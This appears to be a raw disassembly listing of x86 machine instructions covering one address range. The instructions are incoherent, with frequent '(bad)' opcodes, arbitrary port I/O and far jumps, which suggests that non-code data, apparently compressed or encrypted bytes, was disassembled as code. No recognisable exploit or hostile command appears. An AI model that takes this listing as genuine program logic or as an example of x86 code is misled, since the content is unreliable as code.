  42dc8b:	mov    ch,0xbf
  42dc8d:	jae    0x42dc70
  42dc8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  42dcf4:	cmp    DWORD PTR [edi-0x2010f093],esi
  42dcfa:	jnp    0x42dcb3
  42dcfc:	adc    BYTE PTR [eax],ch
  42dcfe:	jne    0x42dce6
  42dd00:	ins    BYTE PTR es:[edi],dx
  42dd01:	and    al,0x58
  42dd03:	imul   BYTE PTR [edx+ebp*8]
  42dd06:	add    DWORD PTR [eax],eax
  42dd08:	add    al,0x1
  42dd0a:	add    BYTE PTR [eax],al
  42dd0c:	jle    0x811c3e59
  42dd12:	fmul   QWORD PTR [esi-0x67edc75a]
  42dd18:	aaa    
  42dd19:	aas    
  42dd1a:	popa   
  42dd1b:	mov    al,0x6e
  42dd1d:	pop    es
  42dd1e:	ds loope 0x42dd47
  42dd21:	cmp    bh,dh
  42dd23:	sti    
  42dd24:	popf   
  42dd25:	xchg   ebx,eax
  42dd26:	mov    ds:0xaa5ed56,eax
  42dd2b:	repz inc ecx
  42dd2d:	dec    esi
  42dd2e:	repz cmp DWORD PTR [esp+ecx*4-0x28cab546],0x76197bf7
  42dd3a:	bound  esi,QWORD PTR [esi+0xd4c2910]
  42dd40:	mul    BYTE PTR [ebp+0x69]
  42dd43:	ss das 
  42dd45:	fdivr  st,st(5)
  42dd47:	pop    ebp
  42dd48:	gs and bl,ah
  42dd4b:	outs   dx,BYTE PTR ds:[esi]
  42dd4c:	xor    BYTE PTR [edx],dl
  42dd4e:	outs   dx,BYTE PTR ds:[esi]
  42dd4f:	push   es
  42dd50:	push   es
  42dd51:	test   eax,0xe6769484
  42dd56:	mov    esp,0xbf1dbe95
  42dd5b:	mov    BYTE PTR [ebp+0x4c],dh
  42dd5e:	add    esi,DWORD PTR [ebx+ebx*2+0xe]
  42dd62:	mov    eax,0xde81cacf
  42dd67:	inc    ecx
  42dd68:	add    dh,0x4e
  42dd6b:	push   esp
  42dd6c:	jno    0x42ddaa
  42dd6e:	and    eax,0x9e03c18
  42dd73:	(bad)  
  42dd74:	dec    BYTE PTR [ebx-0x56]
  42dd77:	lock arpl WORD PTR cs:[eax+eax*8-0x57],cx
  42dd7d:	mov    edx,0xae3710c0
  42dd82:	mov    ds:0x78508930,al
  42dd87:	(bad)  
  42dd88:	jno    0x42dd31
  42dd8a:	mov    DWORD PTR [ebx-0x79],esi
  42dd8d:	call   0xa6003815
  42dd92:	fistp  DWORD PTR [ebx+0x7316a481]
  42dd98:	add    eax,0xd35e2537
  42dd9d:	adc    ecx,ebx
  42dd9f:	cmc    
  42dda0:	jge    0x42dd82
  42dda2:	dec    edi
  42dda3:	scas   al,BYTE PTR es:[edi]
  42dda4:	gs jbe 0x42dde0
  42dda7:	rcl    BYTE PTR [ecx+0x3],cl
  42ddaa:	sub    edx,DWORD PTR [edi]
  42ddac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ddad:	rcl    BYTE PTR [eax+0x21],1
  42ddb0:	ret    
  42ddb1:	mov    dl,0x84
  42ddb3:	xor    DWORD PTR [edi+edi*2],0xf8ddef96
  42ddba:	ss out 0xf7,al
  42ddbd:	aad    0x7b
  42ddbf:	xchg   ebx,eax
  42ddc0:	aad    0xe
  42ddc2:	mov    ah,0x9c
  42ddc4:	dec    esi
  42ddc5:	sub    DWORD PTR [ebx-0x27],esi
  42ddc8:	jp     0x42ddcf
  42ddca:	add    dl,BYTE PTR ds:0x220fc81a
  42ddd0:	iret   
  42ddd1:	jnp    0x42dd6d
  42ddd3:	sar    ah,1
  42ddd5:	fild   DWORD PTR [ebx+ecx*1]
  42ddd8:	ja     0x42ddf4
  42ddda:	xchg   BYTE PTR [esi],bl
  42dddc:	and    ebp,edi
  42ddde:	in     eax,0x3a
  42dde0:	xor    ebp,0x47898f57
  42dde6:	imul   edi,DWORD PTR [eax],0x6
  42dde9:	mov    eax,0x1829d263
  42ddee:	add    bh,BYTE PTR ss:[edx]
  42ddf1:	out    0x99,eax
  42ddf3:	mov    cl,bh
  42ddf5:	add    eax,0x8d13b961
  42ddfa:	mov    ah,ch
  42ddfc:	mov    eax,ds:0xb629e195
  42de01:	les    eax,FWORD PTR [edi-0x14933d61]
  42de07:	inc    ecx
  42de08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42de09:	mov    ah,0x9
  42de0b:	inc    BYTE PTR [ebx+0xdba959]
	...
  42de71:	add    BYTE PTR [eax],al
  42de73:	add    dh,ah
  42de75:	sub    BYTE PTR [ebp-0x1c012cd],0xd7
  42de7c:	fist   DWORD PTR [ebp-0x79]
  42de7f:	das    
  42de80:	jp     0x42de1c
  42de82:	cdq    
  42de83:	mov    esi,0x1eb30
  42de88:	add    al,0x1
  42de8a:	add    BYTE PTR [eax],al
  42de8c:	fs aam 0x5d
  42de8f:	test   BYTE PTR [eax-0x32],dl
  42de92:	mov    edi,0x6f1af519
  42de97:	mov    ecx,0xcf4ddc48
  42de9c:	cmp    ebp,DWORD PTR [ecx-0x52]
  42de9f:	jp     0x42deac
  42dea1:	dec    edi
  42dea2:	lods   eax,DWORD PTR ds:[esi]
  42dea3:	mov    ebp,0x683d88a1
  42dea8:	jge    0x42defd
  42deaa:	add    ebx,DWORD PTR [ebp-0x58]
  42dead:	sub    DWORD PTR [edx],esp
  42deaf:	imul   ecx,DWORD PTR [esi-0x5a],0x2e
  42deb3:	xchg   esi,eax
  42deb4:	mov    bl,0x6d
  42deb6:	xchg   esp,eax
  42deb7:	sar    DWORD PTR [eax-0x71],0xd5
  42debb:	icebp  
  42debc:	cmp    eax,0x2f76bf3f
  42dec1:	mov    cs,ebp
  42dec3:	loop   0x42de54
  42dec5:	pop    edi
  42dec6:	inc    esi
  42dec7:	jle    0x42de56
  42dec9:	adc    eax,0xfc844002
  42dece:	mov    bl,BYTE PTR [ecx-0x1d]
  42ded1:	out    0x5f,eax
  42ded3:	cdq    
  42ded4:	imul   ecx,DWORD PTR [edi+0x4cf04907],0xffffff9e
  42dedb:	mov    ch,0xba
  42dedd:	inc    eax
  42dede:	pop    ecx
  42dedf:	mov    ds:0x568f5c14,eax
  42dee4:	into   
  42dee5:	sbb    edx,DWORD PTR [eax]
  42dee7:	xor    al,0xf9
  42deea:	fwait
  42deeb:	lds    ebx,FWORD PTR [ecx+0x5c223d23]
  42def1:	not    BYTE PTR [ebx+ecx*8+0x7]
  42def5:	push   es
  42def6:	or     eax,DWORD PTR [ecx+edx*1]
  42def9:	test   al,0x96
  42defb:	icebp  
  42defc:	mov    ebp,0xaa4714
  42df01:	cli    
  42df02:	in     eax,0x6c
  42df04:	mov    esi,0xc521ce69
  42df09:	hlt    
  42df0a:	repz jnp 0x42df6f
  42df0d:	or     al,0xc0
  42df0f:	or     BYTE PTR ds:0xa82630cd,0x3b
  42df16:	es scas eax,DWORD PTR es:[edi]
  42df18:	or     al,0x1c
  42df1a:	adc    DWORD PTR [edi+0x2ac6c34],0xe446f822
  42df24:	push   cs
  42df25:	stos   BYTE PTR es:[edi],al
  42df26:	cmp    bl,BYTE PTR [edx]
  42df28:	ret    
  42df29:	mov    edx,0xdb8256b5
  42df2e:	popf   
  42df2f:	sub    eax,0xdcb4ab0
  42df34:	xor    BYTE PTR [edx+0x65],cl
  42df37:	aad    0x53
  42df39:	outs   dx,DWORD PTR ds:[esi]
  42df3a:	sbb    al,bl
  42df3c:	fisub  WORD PTR [esi+0x11]
  42df3f:	sbb    ebp,DWORD PTR [eax-0x5643e02]
  42df45:	jo     0x42df92
  42df47:	aad    0xf
  42df49:	xchg   ebx,eax
  42df4a:	and    cl,BYTE PTR [edx]
  42df4c:	rcr    cl,1
  42df4e:	mov    eax,ds:0xf9cc460b
  42df53:	cmp    al,0x81
  42df55:	out    dx,eax
  42df56:	lahf   
  42df57:	test   BYTE PTR [ebx-0x7b],bh
  42df5a:	mov    ch,0x79
  42df5c:	ins    DWORD PTR es:[edi],dx
  42df5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42df5e:	outs   dx,BYTE PTR ds:[esi]
  42df5f:	mov    ecx,0x384d8d05
  42df64:	shl    BYTE PTR [ebp+0x6cdf362a],0x17
  42df6b:	(bad)  
  42df6c:	sbb    bl,BYTE PTR [esi]
  42df6e:	int    0xb4
  42df70:	dec    ecx
  42df71:	scas   eax,DWORD PTR es:[edi]
  42df72:	xlat   BYTE PTR ds:[ebx]
  42df73:	sbb    BYTE PTR [esi],bh
  42df75:	adc    DWORD PTR [eax],esi
  42df77:	lods   eax,DWORD PTR ds:[esi]
  42df78:	cld    
  42df79:	mov    ?,esp
  42df7b:	inc    esi
  42df7c:	not    dl
  42df7e:	or     bh,al
  42df80:	loopne 0x42df21
  42df82:	sbb    DWORD PTR [edx-0xfe0da11],0xffffffb6
  42df89:	outs   dx,DWORD PTR ds:[esi]
  42df8a:	outs   dx,DWORD PTR ds:[esi]
  42df8b:	out    dx,al
  42df8c:	cmp    eax,0xfa5853
	...
  42dff1:	add    BYTE PTR [eax],al
  42dff3:	add    BYTE PTR [edx],al
  42dff5:	(bad)  
  42dff6:	jb     0x42df9e
  42dff8:	(bad)  
  42dff9:	scas   al,BYTE PTR es:[edi]
  42dffa:	(bad)  
  42dffb:	dec    BYTE PTR [edi-0x30]
  42dffe:	fisttp WORD PTR [esi+0x17]
  42e001:	cdq    
  42e002:	xor    al,0xe1
  42e004:	xor    al,0xec
  42e006:	add    DWORD PTR [eax],eax
  42e008:	add    al,0x1
  42e00a:	add    BYTE PTR [eax],al
  42e00c:	or     ecx,DWORD PTR [eax-0x18]
  42e00f:	out    dx,eax
  42e010:	dec    ebp
  42e011:	sbb    al,0x42
  42e013:	mov    al,0x4e
  42e015:	scas   eax,DWORD PTR es:[edi]
  42e016:	in     eax,0x57
  42e018:	or     eax,0xad31ea64
  42e01d:	or     esp,eax
  42e01f:	in     al,dx
  42e020:	cdq    
  42e021:	jmp    0x361d:0xdee5feb1
  42e028:	pop    ds
  42e029:	call   DWORD PTR [edi-0x78c5f5da]
  42e02f:	mov    edi,0x2c0ebe18
  42e034:	jbe    0x42e08c
  42e036:	push   edi
  42e037:	mov    edx,0x91240d41
  42e03c:	es (bad) 
  42e03e:	hlt    
  42e03f:	mov    BYTE PTR [ecx],bh
  42e041:	test   eax,0xb9be355b
  42e046:	lods   eax,DWORD PTR ds:[esi]
  42e047:	jmp    0x8d13:0xbaac4523
  42e04e:	xchg   ecx,eax
  42e04f:	sub    al,0x1d
  42e051:	in     al,dx
  42e052:	dec    esp
  42e053:	sbb    al,0x6
  42e055:	pop    esp
  42e056:	repz (bad) 
  42e058:	jb     0x42dfe0
  42e05a:	adc    dh,BYTE PTR [edi-0x30]
  42e05d:	scas   al,BYTE PTR es:[edi]
  42e05e:	add    eax,0x61c7f4d6
  42e063:	push   ds
  42e064:	sub    DWORD PTR [edi+esi*4],ebp
  42e067:	dec    edi
  42e068:	xchg   esi,eax
  42e069:	cs sub al,0xd2
  42e06c:	rcr    BYTE PTR [ecx],cl
  42e06e:	arpl   WORD PTR [edi],di
  42e070:	fcmovbe st,st(3)
  42e072:	push   ebx
  42e073:	in     eax,0xf5
  42e075:	pushf  
  42e076:	sub    dl,al
  42e078:	mov    ds:0xbadadbfa,al
  42e07d:	(bad)  
  42e07e:	mov    dl,0xb0
  42e080:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e081:	add    dh,BYTE PTR [esi-0x45]
  42e084:	pop    eax
  42e085:	inc    ecx
  42e086:	scas   al,BYTE PTR es:[edi]
  42e087:	mov    esp,0x52cc0669
  42e08c:	mov    ecx,0x1225c110
  42e091:	xchg   edx,eax
  42e092:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e093:	leave  
  42e094:	fwait
  42e095:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e096:	jmp    0x42e066
  42e098:	xor    al,0xc9
  42e09a:	cmc    
  42e09b:	daa    
  42e09c:	inc    edx
  42e09d:	outs   dx,DWORD PTR ds:[esi]
  42e09e:	gs and al,0x6e
  42e0a1:	push   0x33faa12d
  42e0a6:	std    
  42e0a7:	retf   
  42e0a8:	push   esi
  42e0a9:	repnz int 0x6
  42e0ac:	mov    bl,BYTE PTR [edi+0x54663d4f]
  42e0b2:	dec    esi
  42e0b3:	push   ds
  42e0b4:	inc    esp
  42e0b5:	in     al,dx
  42e0b6:	push   ecx
  42e0b7:	add    esp,0xe4c4ca79
  42e0bd:	enter  0x2134,0xce
  42e0c1:	adc    DWORD PTR [ebx],0xb38c687c
  42e0c7:	jo     0x42e073
  42e0c9:	push   esi
  42e0ca:	cwde   
  42e0cb:	dec    edx
  42e0cc:	mov    ecx,0xab10db23
  42e0d1:	sbb    eax,0x77cf6118
  42e0d6:	icebp  
  42e0d7:	lock push ss
  42e0d9:	add    DWORD PTR [edx-0x1c],ebx
  42e0dc:	push   ss
  42e0dd:	xchg   esi,eax
  42e0de:	test   eax,0x3bb51dae
  42e0e3:	adc    BYTE PTR es:[eax+0x6efe8d24],bl
  42e0ea:	inc    esp
  42e0eb:	pop    eax
  42e0ec:	inc    ebp
  42e0ed:	sub    DWORD PTR [ecx+0x5f512b15],esi
  42e0f3:	jo     0x42e149
  42e0f5:	cmp    esi,DWORD PTR [eax]
  42e0f7:	ins    BYTE PTR es:[edi],dx
  42e0f8:	les    ebx,FWORD PTR [ebp+0x27]
  42e0fb:	cwde   
  42e0fc:	retf   
  42e0fd:	xchg   DWORD PTR [eax-0x3],esi
  42e100:	mov    eax,es:0x69648c71
  42e106:	rcl    DWORD PTR [ebx-0x2a049ef1],cl
  42e10c:	sahf   
  42e10d:	sti    
  42e10e:	cmp    cl,BYTE PTR [ecx]
	...
  42e174:	mov    eax,ds:0x7e061ecf
  42e179:	xlat   BYTE PTR ds:[ebx]
  42e17a:	mov    ecx,0x35bb80ef
  42e17f:	xchg   edi,eax
  42e180:	in     al,0xca
  42e182:	imul   edi,ebx,0x1ed38
  42e188:	add    al,0x1
  42e18a:	add    BYTE PTR [eax],al
  42e18c:	jno    0x42e1e0
  42e18e:	in     al,0x91
  42e190:	icebp  
  42e191:	jle    0x42e201
  42e193:	loop   0x42e128
  42e195:	add    DWORD PTR [edx-0x35],esi
  42e198:	mov    bh,0xfb
  42e19a:	and    DWORD PTR [ebx+edx*1-0x7f],edx
  42e19e:	call   0xa4d92558
  42e1a3:	dec    ecx
  42e1a4:	adc    eax,0xaf8f9689
  42e1a9:	mov    bl,0x92
  42e1ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e1ac:	aaa    
  42e1ad:	adc    esp,0xffffffde
  42e1b0:	push   ds
  42e1b1:	pop    ds
  42e1b2:	cld    
  42e1b3:	and    bh,BYTE PTR [ebp-0x75]
  42e1b6:	pop    ecx
  42e1b7:	push   eax
  42e1b8:	jne    0x42e19d
  42e1ba:	call   0x709b:0xcf730c62
  42e1c1:	pop    ebp
  42e1c2:	aaa    
  42e1c3:	add    al,0xe0
  42e1c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e1c6:	push   edi
  42e1c7:	mov    ds:0x40091cdc,al
  42e1cc:	sub    eax,0xe944343b
  42e1d1:	mov    esp,0xee720751
  42e1d6:	fcom   QWORD PTR ds:[esi-0x48e92747]
  42e1dd:	popf   
  42e1de:	ror    DWORD PTR [ebp+0x15],cl
  42e1e1:	cs ins BYTE PTR es:[edi],dx
  42e1e3:	sbb    BYTE PTR cs:[esp+edi*2-0x24],al
  42e1e8:	push   0x37
  42e1ea:	push   edi
  42e1eb:	pop    ecx
  42e1ec:	xor    edi,eax
  42e1ee:	pop    eax
  42e1ef:	fdivr  DWORD PTR ds:[ebp-0x58]
  42e1f3:	aas    
  42e1f4:	add    eax,0xb76946be
  42e1f9:	int3   
  42e1fa:	and    ebp,DWORD PTR [esi]
  42e1fc:	add    BYTE PTR [ebp-0x4288ce19],al
  42e202:	scas   al,BYTE PTR es:[edi]
  42e203:	jle    0x42e1cc
  42e205:	mov    cl,ch
  42e207:	out    dx,eax
  42e208:	cmp    ecx,edx
  42e20a:	lock nop
  42e20c:	mov    eax,edi
  42e20e:	push   esp
  42e20f:	inc    si
  42e211:	test   al,0xe4
  42e213:	out    0x26,al
  42e215:	lahf   
  42e216:	pop    eax
  42e217:	pop    esp
  42e218:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e219:	ins    DWORD PTR es:[edi],dx
  42e21a:	cld    
  42e21b:	push   ss
  42e21c:	(bad)  
  42e21d:	push   ss
  42e21e:	add    al,BYTE PTR [eax]
  42e220:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e221:	ja     0x42e269
  42e223:	test   eax,0x1a4cb028
  42e228:	rcl    cl,cl
  42e22a:	push   edx
  42e22b:	popf   
  42e22c:	fstp   QWORD PTR [ebx-0x2c]
  42e22f:	bnd jbe 0x42e29c
  42e232:	xchg   esp,eax
  42e233:	clc    
  42e234:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e235:	cmp    ecx,ebp
  42e237:	inc    esi
  42e238:	dec    esp
  42e239:	and    bl,ch
  42e23b:	pushf  
  42e23c:	jl     0x42e2b0
  42e23e:	mov    al,0xed
  42e240:	mov    ds:0xcbfc6ebe,eax
  42e245:	dec    eax
  42e246:	xlat   BYTE PTR ds:[ebx]
  42e247:	mov    edi,0xa0143641
  42e24c:	rol    BYTE PTR [ebx-0x4f4f2b74],1
  42e252:	add    DWORD PTR [edx+ebp*4],esi
  42e255:	push   es
  42e256:	inc    edi
  42e257:	mov    ah,0xd1
  42e259:	push   ds
  42e25a:	popw   ds
  42e25c:	push   ds
  42e25d:	(bad)  
  42e25e:	std    
  42e25f:	pop    esi
  42e260:	sbb    DWORD PTR [ebx+eax*8+0x6c],0xda39b168
  42e268:	dec    eax
  42e269:	clc    
  42e26a:	pop    ebp
  42e26b:	lahf   
  42e26c:	fucomip st,st(5)
  42e26e:	sub    al,0xb7
  42e270:	dec    ecx
  42e271:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e272:	adc    esp,DWORD PTR [ebx+0x6e]
  42e275:	sbb    edi,DWORD PTR [edi]
  42e277:	in     al,dx
  42e278:	mov    ?,WORD PTR [ecx]
  42e27a:	ins    BYTE PTR es:[edi],dx
  42e27b:	mov    al,ds:0x6f167529
  42e280:	aad    0x60
  42e282:	mov    ecx,0xefccfc25
  42e287:	int3   
  42e288:	jecxz  0x42e2c5
  42e28a:	in     al,dx
  42e28b:	sub    al,0x80
  42e28d:	push   edx
  42e28e:	xchg   edx,eax
  42e28f:	or     al,BYTE PTR [eax]
	...
  42e2f1:	add    BYTE PTR [eax],al
  42e2f3:	add    BYTE PTR [ebp-0x655875c3],ch
  42e2f9:	mov    bh,0xad
  42e2fb:	aas    
  42e2fc:	mov    ebx,0xe3199140
  42e301:	and    eax,0xee3cd420
  42e306:	add    DWORD PTR [eax],eax
  42e308:	add    al,0x1
  42e30a:	add    BYTE PTR [eax],al
  42e30c:	pop    es
  42e30d:	pop    edi
  42e30e:	jb     0x42e2e4
  42e310:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e311:	(bad)  
  42e312:	std    
  42e313:	mov    ch,0x68
  42e315:	pusha  
  42e316:	mov    ds:0xa07cf624,eax
  42e31b:	push   cs
  42e31c:	repnz push ebx
  42e31e:	mov    dh,0x96
  42e320:	push   DWORD PTR [ebx+0x48]
  42e323:	daa    
  42e324:	mov    dh,0x72
  42e326:	call   0xbd93:0x1da50101
  42e32d:	pop    ecx
  42e32e:	pmaxub mm7,QWORD PTR [ebp+eiz*2-0x18]
  42e333:	push   es
  42e334:	(bad)  
  42e335:	jg     0x42e396
  42e337:	push   ss
  42e338:	ins    BYTE PTR es:[edi],dx
  42e339:	fist   WORD PTR [ebp+0x36]
  42e33c:	or     eax,0x90321a66
  42e341:	push   ebp
  42e342:	push   edi
  42e343:	mov    dl,0x32
  42e345:	mov    ebp,0x8ab5647d
  42e34a:	push   cs
  42e34b:	inc    ebp
  42e34c:	dec    ebp
  42e34d:	sub    edi,DWORD PTR [edi-0x3d7f6005]
  42e353:	mov    ds:0x2b229b3b,eax
  42e358:	jno    0x42e3af
  42e35a:	inc    edx
  42e35b:	lahf   
  42e35c:	out    dx,al
  42e35d:	or     edi,eax
  42e35f:	enter  0xb0ab,0xc4
  42e363:	pop    ebx
  42e364:	data16 data16 cmp al,0x91
  42e368:	push   ecx
  42e369:	or     DWORD PTR [eax-0x3d],edi
  42e36c:	jbe    0x42e340
  42e36e:	xor    al,0x6b
  42e370:	pop    es
  42e371:	clc    
  42e372:	imul   edi,DWORD PTR [eax+edi*2-0x7f49d9f3],0x2628c1f
  42e37d:	push   0x3102dca3
  42e382:	(bad)  
  42e383:	hlt    
  42e384:	test   BYTE PTR [ebx],ch
  42e386:	inc    ebp
  42e387:	mov    al,0x5f
  42e389:	lahf   
  42e38a:	retf   0xf4f7
  42e38d:	push   0xffffffde
  42e38f:	cmp    al,0x1c
  42e391:	push   eax
  42e392:	repz retf 
  42e394:	fiadd  WORD PTR [ebx-0x43]
  42e397:	jg     0x42e3c7
  42e399:	in     al,dx
  42e39a:	mov    eax,ds:0x68135dca
  42e39f:	inc    ebx
  42e3a0:	data16 adc al,0xb3
  42e3a3:	test   DWORD PTR [ebp+0x66e087d0],ebx
  42e3a9:	xchg   edi,eax
  42e3aa:	jb     0x42e3b2
  42e3ac:	add    BYTE PTR [ebx-0x27],al
  42e3af:	dec    edi
  42e3b0:	sub    eax,ebx
  42e3b2:	inc    ebx
  42e3b3:	es jmp 0x42e3bf
  42e3b6:	(bad)  [esi+0x5]
  42e3b9:	mov    ecx,0x7d8a567
  42e3be:	not    esi
  42e3c0:	out    dx,al
  42e3c1:	imul   eax,DWORD PTR [ebx],0xffffffaf
  42e3c4:	jl     0x42e405
  42e3c6:	cld    
  42e3c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e3c8:	pop    edx
  42e3c9:	mov    DWORD PTR [ebp-0x2333fdd7],ebp
  42e3cf:	xor    ah,ch
  42e3d1:	not    DWORD PTR [eax]
  42e3d3:	pusha  
  42e3d4:	and    DWORD PTR [ecx+0x49],ebx
  42e3d7:	sub    BYTE PTR [edi],al
  42e3d9:	adc    eax,0xbb7272bd
  42e3de:	cli    
  42e3df:	push   es
  42e3e0:	push   ds
  42e3e1:	das    
  42e3e2:	hlt    
  42e3e3:	ins    BYTE PTR es:[edi],dx
  42e3e4:	jmp    0x42e390
  42e3e6:	pop    ecx
  42e3e7:	aad    0x2e
  42e3e9:	shl    BYTE PTR [ebx-0x3d7d3656],cl
  42e3ef:	push   ebp
  42e3f0:	add    DWORD PTR [ebp+0x1fcbf735],eax
  42e3f6:	test   BYTE PTR [ecx-0x80],cl
  42e3f9:	jne    0x42e3eb
  42e3fb:	rcl    BYTE PTR [edi],0xab
  42e3fe:	cmp    DWORD PTR [ecx+0x51c3abd],0x7c
  42e405:	mov    edx,0xdf73aa1a
  42e40a:	int    0x17
  42e40c:	cmc    
  42e40d:	call   0x0:0x6e61
	...
  42e474:	loop   0x42e433
  42e476:	fadd   st(7),st
  42e478:	(bad)  
  42e47a:	sti    
  42e47b:	mov    ebp,0xe093f290
  42e480:	add    BYTE PTR [eax-0x10bf1572],0x1
  42e487:	add    BYTE PTR [ecx+eax*1],al
  42e48a:	add    BYTE PTR [eax],al
  42e48c:	loop   0x42e4c6
  42e48e:	push   0x5b
  42e490:	hlt    
  42e491:	add    DWORD PTR [ebx],edx
  42e493:	dec    ebx
  42e494:	inc    ebp
  42e495:	fs dec eax
  42e497:	bound  esi,QWORD PTR [ebp+edi*2+0x79]
  42e49b:	dec    edi
  42e49c:	jno    0x42e4f4
  42e49e:	mov    ah,0x58
  42e4a0:	and    eax,0x83d4238e
  42e4a5:	ins    BYTE PTR es:[edi],dx
  42e4a6:	mov    ecx,0x3f31ec38
  42e4ab:	int3   
  42e4ac:	pop    ss
  42e4ad:	hlt    
  42e4ae:	fstp   TBYTE PTR [edx+0x6083a169]
  42e4b4:	enter  0x1b9,0x2e
  42e4b8:	loope  0x42e493
  42e4ba:	xchg   esp,eax
  42e4bb:	in     al,dx
  42e4bc:	xor    al,0xb5
  42e4be:	fidiv  WORD PTR [ebp-0x27be6d42]
  42e4c4:	push   ss
  42e4c5:	daa    
  42e4c6:	push   edx
  42e4c7:	mov    ds:0x4fa8f552,al
  42e4cc:	sbb    eax,0xc5b75b40
  42e4d1:	aad    0xd8
  42e4d3:	mov    eax,0x96bad006
  42e4d8:	inc    eax
  42e4d9:	pop    es
  42e4da:	std    
  42e4db:	mul    BYTE PTR [ebp+0x4cc8dd14]
  42e4e1:	push   cs
  42e4e2:	push   ss
  42e4e3:	and    esi,ecx
  42e4e5:	jne    0x42e4bd
  42e4e7:	into   
  42e4e8:	mov    DWORD PTR [edx+0x57],edx
  42e4eb:	mov    BYTE PTR [ebx-0x1b],ch
  42e4ee:	xor    eax,0x457681a4
  42e4f3:	fadd   DWORD PTR [esi-0x704be30]
  42e4f9:	jge    0x2009c8aa
  42e4ff:	mov    ecx,0x26da1534
  42e504:	data16 jl 0x42e565
  42e507:	adc    al,0xe2
  42e509:	aas    
  42e50a:	xchg   esp,eax
  42e50b:	stos   BYTE PTR es:[edi],al
  42e50c:	sbb    cl,BYTE PTR [esi+0x73389872]
  42e512:	add    eax,0xc7017016
  42e517:	push   esi
  42e518:	jne    0x42e543
  42e51a:	sub    dh,ch
  42e51c:	das    
  42e51d:	jmp    0x42e4b1
  42e51f:	pop    ebp
  42e520:	xor    al,0x6d
  42e522:	or     eax,0x5265e95d
  42e527:	es push ebx
  42e529:	in     eax,0xa0
  42e52b:	and    eax,0x13e71f1b
  42e530:	out    dx,al
  42e531:	cld    
  42e532:	xor    bl,bl
  42e534:	sub    DWORD PTR [ebx+0x22956c24],0xe6fe8ad1
  42e53e:	scas   eax,DWORD PTR es:[edi]
  42e53f:	jns    0x42e52a
  42e541:	add    edx,DWORD PTR [edi-0x4fc82517]
  42e547:	out    dx,al
  42e548:	adc    dl,BYTE PTR [ebx+eax*8+0x2d8ce298]
  42e54f:	jae    0x42e515
  42e551:	ins    BYTE PTR es:[edi],dx
  42e552:	int3   
  42e553:	jecxz  0x42e586
  42e555:	mov    edi,0x9f5c3b9a
  42e55a:	stos   BYTE PTR es:[edi],al
  42e55b:	adc    al,0x73
  42e55d:	mov    edi,0x96a60b5b
  42e562:	in     al,0xaf
  42e564:	sub    BYTE PTR [ecx-0x475e42e4],ch
  42e56a:	loope  0x42e524
  42e56c:	sbb    eax,0x81010ca2
  42e571:	jb     0x42e572
  42e573:	arpl   WORD PTR [ebx-0x17],di
  42e576:	cmp    eax,0x2ccd68ea
  42e57b:	mov    esp,0x17e74152
  42e580:	inc    esp
  42e581:	jmp    0x42e58a
  42e583:	popa   
  42e584:	sub    al,0x66
  42e586:	sti    
  42e587:	repnz pop ebp
  42e589:	mov    ebx,?
  42e58b:	hlt    
  42e58c:	(bad)  
  42e58d:	outs   dx,DWORD PTR ds:[esi]
  42e58e:	pushf  
  42e58f:	ins    DWORD PTR es:[edi],dx
	...
  42e5f4:	push   ebp
  42e5f5:	cmp    dh,cl
  42e5f7:	adc    bh,ch
  42e5f9:	neg    bh
  42e5fb:	jge    0x42e58f
  42e5fd:	xchg   ebp,eax
  42e5fe:	jns    0x42e631
  42e600:	int3   
  42e601:	push   edx
  42e602:	push   0xffffffe2
  42e604:	inc    esp
  42e605:	lock add DWORD PTR [eax],eax
  42e608:	add    al,0x1
  42e60a:	add    BYTE PTR [eax],al
  42e60c:	mov    edi,0xb58d7ab
  42e611:	jns    0x42e60f
  42e613:	cdq    
  42e614:	push   ebx
  42e615:	inc    eax
  42e616:	and    BYTE PTR [edx+0x586810c1],bl
  42e61c:	jne    0x42e5b7
  42e61e:	call   0x7118145d
  42e623:	sti    
  42e624:	scas   eax,DWORD PTR es:[edi]
  42e625:	jp     0x42e6a4
  42e627:	cli    
  42e628:	lods   al,BYTE PTR ds:[esi]
  42e629:	lods   eax,DWORD PTR ds:[esi]
  42e62a:	fsub   QWORD PTR [ebx]
  42e62c:	retf   
  42e62d:	ins    DWORD PTR es:[edi],dx
  42e62e:	loope  0x42e655
  42e630:	mov    bh,0xaf
  42e632:	sbb    al,0x32
  42e634:	fisubr DWORD PTR [esi]
  42e636:	gs stos BYTE PTR es:[edi],al
  42e638:	inc    ecx
  42e639:	iret   
  42e63a:	push   ss
  42e63b:	inc    esi
  42e63c:	outs   dx,BYTE PTR ss:[esi]
  42e63e:	xchg   esp,eax
  42e63f:	daa    
  42e640:	adc    al,0x28
  42e642:	comiss xmm7,DWORD PTR [ebp+0x33be5a4c]
  42e649:	push   esp
  42e64a:	push   cs
  42e64b:	add    BYTE PTR es:[esi],bh
  42e64e:	jbe    0x42e6a1
  42e650:	mov    edi,0x8a1c6ad6
  42e655:	addr16 loop 0x42e672
  42e658:	fs dec edi
  42e65a:	pop    esp
  42e65b:	cmp    eax,0xbaf01fd1
  42e660:	jg     0x42e650
  42e662:	and    DWORD PTR [ebx-0x71],0x16
  42e666:	adc    al,0xa5
  42e668:	inc    ebp
  42e669:	pop    esp
  42e66a:	cli    
  42e66b:	stos   BYTE PTR es:[edi],al
  42e66c:	je     0x42e643
  42e66e:	adc    eax,0x570e9120
  42e673:	aaa    
  42e674:	stos   DWORD PTR es:[edi],eax
  42e675:	int    0x77
  42e677:	mov    al,ds:0x7fb9049a
  42e67c:	sbb    BYTE PTR ss:[edi-0x55],bh
  42e680:	jmp    FWORD PTR [eax+0x1e5f549]
  42e686:	xor    eax,0x271c8250
